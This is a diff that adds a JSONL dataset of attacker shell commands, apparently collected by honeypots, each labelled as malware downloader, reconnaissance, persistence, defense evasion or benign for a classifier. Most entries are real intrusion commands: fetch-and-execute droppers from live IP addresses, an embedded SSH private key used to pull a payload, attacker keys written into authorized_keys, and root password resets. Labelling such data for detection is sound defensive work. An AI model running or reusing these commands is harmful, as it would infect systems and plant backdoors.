@@ -1,0 +1,140 @@
+{"command": "cd /tmp && pwd || cd /var/run && pwd || cd /dev/shm && pwd", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "busybox wget http://77.90.185.66/wget -O-", "count": 64, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": ">/dev/.f && /bin/busybox chmod 777 /dev/.f && /dev/.f && cd /dev/; ", "count": 25, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox hostname slur", "count": 3, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh", "count": 28, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "busybox tftp -g 185.93.89.72 -r tftp -l-", "count": 42, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "lghkel", "count": 48, "sample": "typical_weighted", "label": "benign"}
+{"command": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "count": 159, "sample": "typical_weighted", "label": "defense_evasion"}
+{"command": ">/.codi && cd /", "count": 56, "sample": "novel_family", "label": "reconnaissance"}
+{"command": ">/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/", "count": 65, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "count": 4, "sample": "novel_family", "label": "benign"}
+{"command": "for proc_dir in /proc/*; do;     pid=${proc_dir##*/};     result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null);     if [ \"$result\" != \"${result%(deleted)}\" ]; then;         kill -9 \"$pid\";     fi; done", "count": 70, "sample": "typical_weighted", "label": "defense_evasion"}
+{"command": "/bin/busybox tftp 45.150.195.235 -g -r tmips -l .a && /bin/busybox chmod 777 .a && ./.a telnet.tftp", "count": 101, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh", "count": 8, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "chmod 777 update.sh 2>&1", "count": 4, "sample": "typical_weighted", "label": "malware_execution"}
+{"command": "wget -O /dev/shm/bins.sh http://45.74.3.37:5001/bins.sh", "count": 1, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "/bin/busybox echo > /usr/.fxcat && sh /usr/.fxcat && cd /usr/", "count": 381, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget http://91.199.133.133:8080/deploy.sh -O /tmp/.ds 2 > /dev/null", "count": 6, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f", "count": 42, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "bah", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "/bin/busybox MIORI", "count": 8, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "w", "count": 7, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s", "count": 174, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "tftp -g 77.90.185.66 -r tftp -l-", "count": 42, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "cat /proc/mounts; /bin/busybox CPRIK", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /var/tmp/.b && sh /var/tmp/.b && cd /var/tmp/", "count": 241, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "cd /proc && cat self/cmdline", "count": 111, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "cd /tmp && wget -q http://176.65.139.202:80/telnet.sh -O telnet.sh && chmod 777 telnet.sh && sh telnet.sh", "count": 21, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "wget http://176.65.139.202:80/daredevil.x86_64 -O /tmp/d.x86_64;chmod 777 /tmp/d.x86_64;/tmp/d.x86_64 selfrep", "count": 3, "sample": "novel_family", "label": "malware_downloader"}
+{"command": ">/var/d && chmod 777 /var/d && /var/d && cd /var/", "count": 65, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": ">/usr/.codi && cd /usr/", "count": 56, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "rm -rf .ffaaxx .d", "count": 378, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": ">/etc/.codi && cd /etc/", "count": 56, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "./bot &", "count": 3, "sample": "novel_family", "label": "malware_execution"}
+{"command": "echo \"root:VGlKmVMGDuKu\"|chpasswd|bash", "count": 1, "sample": "novel_family", "label": "persistence"}
+{"command": "echo -ne \"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x54\\xae\\x00\\x00\\x34\\x00\\x00\\x00\" > update.XDarmv5l", "count": 2, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "ping ;sh", "count": 589, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "whoami", "count": 6, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "# Method 2: wget to stdout pipe (some old busybox)", "count": 6, "sample": "novel_family", "label": "benign"}
+{"command": ">/var/tmp/.codi && cd /var/tmp/", "count": 56, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BMQVN", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "&k`g&k|zpkfq)ES[M", "count": 91, "sample": "typical_weighted", "label": "benign"}
+{"command": "uname -s -m", "count": 82, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "wget -q http://176.65.132.8:4444/bot_64 -O bot_64", "count": 20, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "zalee", "count": 91, "sample": "typical_weighted", "label": "benign"}
+{"command": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh", "count": 3, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "cat /proc/mounts; /bin/busybox EBYVD", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /mnt/.b && sh /mnt/.b && cd /mnt/", "count": 241, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "cat /proc/mounts; /bin/busybox UOVQO", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s", "count": 174, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "ls -l bot_64 2>/dev/null || echo '0'", "count": 9, "sample": "novel_family", "label": "reconnaissance"}
+{"command": ">/mnt/.f && /bin/busybox chmod 777 /mnt/.f && /mnt/.f && cd /mnt/; ", "count": 25, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox sNoMf6yo ", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget --no-check-certificate -qO- https://217.60.195.113/sh", "count": 6, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "/bin/busybox echo > /dev/.b && sh /dev/.b && cd /dev/", "count": 241, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": ">/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/", "count": 65, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /var/.b && sh /var/.b && cd /var/", "count": 241, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "top", "count": 6, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox rm -rf condi72 thefuck", "count": 56, "sample": "typical_weighted", "label": "defense_evasion"}
+{"command": "/bin/busybox IZ1H9", "count": 7, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /home/.fxcat && sh /home/.fxcat && cd /home/", "count": 381, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "echo 'rm -f .c $a' >> .s", "count": 174, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon", "count": 31, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/", "count": 381, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget -qO- http://45.74.3.37:5001/bins.sh | sh", "count": 3, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in */lib/*|*/lib64/*|*.so*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done", "count": 272, "sample": "novel_family", "label": "defense_evasion"}
+{"command": "/bin/busybox YAKUZA", "count": 6, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "sh .s; rm -f .s", "count": 174, "sample": "typical_weighted", "label": "malware_execution"}
+{"command": "Contact: <sip:nm@nm>", "count": 18, "sample": "novel_family", "label": "benign"}
+{"command": "echo STARTED", "count": 3, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox V3G4", "count": 9, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "count": 159, "sample": "typical_weighted", "label": "persistence"}
+{"command": "/bin/busybox TEST", "count": 52, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "echo OK", "count": 244, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": ">/etc/.f && /bin/busybox chmod 777 /etc/.f && /etc/.f && cd /etc/; ", "count": 25, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /etc/.fxcat && sh /etc/.fxcat && cd /etc/", "count": 381, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "tftp; wget; /bin/busybox VMTCF", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"", "count": 31, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "cat /proc/cpuinfo | grep name | wc -l", "count": 6, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"", "count": 49, "sample": "typical_weighted", "label": "persistence"}
+{"command": "/bin/busybox echo > /etc/.b && sh /etc/.b && cd /etc/", "count": 241, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "tftp; wget; /bin/busybox YIBCC", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox BOTNET", "count": 18, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "Content-Length: 0", "count": 18, "sample": "typical_weighted", "label": "benign"}
+{"command": "echo -e \"natasha123\\nbaIemyvImW1K\\nbaIemyvImW1K\"|passwd|bash", "count": 1, "sample": "novel_family", "label": "persistence"}
+{"command": "/bin/busybox echo > /mnt/.fxcat && sh /mnt/.fxcat && cd /mnt/", "count": 381, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox WKBZT", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "busybox corona", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": ">/mnt/.codi && cd /mnt/", "count": 56, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s", "count": 174, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "/bin/busybox echo > /boot/.fxcat && sh /boot/.fxcat && cd /boot/", "count": 381, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox HISILICON", "count": 146, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "From: <sip:nm@nm>;tag=root", "count": 18, "sample": "novel_family", "label": "benign"}
+{"command": "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI", "count": 14, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "echo \"root:mjfk9mmm5ecr\"|chpasswd|bash", "count": 1, "sample": "novel_family", "label": "persistence"}
+{"command": "echo WRITABLE >/tmp/.testfile 2>&1", "count": 15, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "sh .k", "count": 70, "sample": "typical_weighted", "label": "malware_execution"}
+{"command": "free -h", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "echo -ne \"\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x78\\x38\\x36\\x5f\\x36\\x34\\x29\\x20\\x41\\x52\\x43\\x48\\x3d\\x22\\x78\\x38\\x36\\x5f\\x36\\x34\\x22\\x20\\x3b\\x3b\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x69\\x2a\\x38\\x36\\x29\\x20\\x41\\x52\\x43\\x48\\x3d\\x22\\x78\\x38\\x36\\x5f\\x36\\x34\\x22\\x20\\x3b\\x3b\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2a\\x29\\x20\\x41\\x52\\x43\\x48\\x3d\\x22\\x6d\\x69\\x70\\x73\\x22\\x20\\x3b\\x3b\\x20\\x23\\x20\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x20\\x66\\x61\\x6c\\x6c\\x62\\x61\\x63\\x6b\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x65\\x73\\x61\\x63\\x0a\" >> update.sh", "count": 76, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "/bin/busybox wget http://95.133.245.15/wget.sh -O- | sh;/bin/busybox tftp -g 95.133.245.15 -r tftp.sh -l- | sh;/bin/busybox ftpget 95.133.245.15 ftpget.sh ftpget.sh && sh ftpget.sh;curl http://95.133.245.15/curl.sh -o- | sh", "count": 348, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "(wget http://91.199.133.133:8080/deploy.sh -O- 2>/dev/null | sh) ||", "count": 6, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "cat /etc/passwd", "count": 11, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon", "count": 14, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox wget http://45.150.195.235/tmips -O - > .a && /bin/busybox chmod 777 .a && ./.a telnet.wget", "count": 105, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": ">/data/d && chmod 777 /data/d && /data/d && cd /data/", "count": 65, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /usr/.b && sh /usr/.b && cd /usr/", "count": 241, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/", "count": 381, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "echo test", "count": 6, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "busybox ftpget 77.90.185.66 f ftpget", "count": 42, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "Call-ID: 50000", "count": 18, "sample": "typical_weighted", "label": "benign"}
+{"command": "FEAT", "count": 6, "sample": "novel_family", "label": "benign"}
+{"command": "/bin/busybox echo > /dev/shm/.fxcat && sh /dev/shm/.fxcat && cd /dev/shm/", "count": 381, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "enablelinuxshell", "count": 106, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget http://176.65.139.202:80/telnet.sh -O /var/tmp/telnet.sh;chmod 777 /var/tmp/telnet.sh;sh /var/tmp/telnet.sh", "count": 3, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"", "count": 6, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=", "count": 8, "sample": "novel_family", "label": "benign"}
+{"command": "/bin/busybox echo > /home/.b && sh /home/.b && cd /home/", "count": 241, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": ">/home/d && chmod 777 /home/d && /home/d && cd /home/", "count": 65, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 45.150.195.235 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;", "count": 541, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": ">/tmp/.codi && cd /tmp/", "count": 56, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/", "count": 381, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": ">/root/d && chmod 777 /root/d && /root/d && cd /root/", "count": 65, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "busybox wget http://5.182.210.174/ok", "count": 1, "sample": "novel_family", "label": "malware_downloader"}
+{"command": ">/dev/.codi && cd /dev/", "count": 56, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "za", "count": 91, "sample": "typical_weighted", "label": "benign"}
+{"command": "echo LOGGED", "count": 5, "sample": "novel_family", "label": "reconnaissance"}
+{"command": ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/", "count": 65, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "head -c 0 > /tmp/linux_sign", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "chmod 777 update.armv5l 2>&1", "count": 3, "sample": "novel_family", "label": "malware_execution"}
+{"command": "cd /dev/", "count": 45, "sample": "typical_weighted", "label": "benign"}
+{"command": "start", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "echo 'wget -q http://94.154.43.92/$a -O .c||curl -s http://94.154.43.92/$a -o .c||tftp -g -l .c -r $a 94.154.43.92||tftp -g -l $a 94.154.43.92' >> .s", "count": 174, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "./mipsel", "count": 2, "sample": "novel_family", "label": "malware_execution"}
+{"command": "User-Agent: curl/7.61.1", "count": 6, "sample": "novel_family", "label": "benign"}
+{"command": ">/data/.f && /bin/busybox chmod 777 /data/.f && /data/.f && cd /data/; ", "count": 25, "sample": "typical_weighted", "label": "reconnaissance"}
+{"command": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /; for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do; wget -q http://94.154.43.92/$a -O .c||curl -s http://94.154.43.92/$a -o .c||tftp -g -l .c -r $a 94.154.43.92||tftp -g -l $a 94.154.43.92; chmod +x .c && ./.c && break || chmod +x $a && ./$a && break; done; rm -f .c $a", "count": 174, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "echo '#!/bin/sh' > .s", "count": 174, "sample": "typical_weighted", "label": "malware_downloader"}
+{"command": "(wget http://91.199.133.133:8080/deploy.sh -O /tmp/.ds 2>/dev/null && sh /tmp/.ds) ||", "count": 6, "sample": "novel_family", "label": "malware_downloader"}
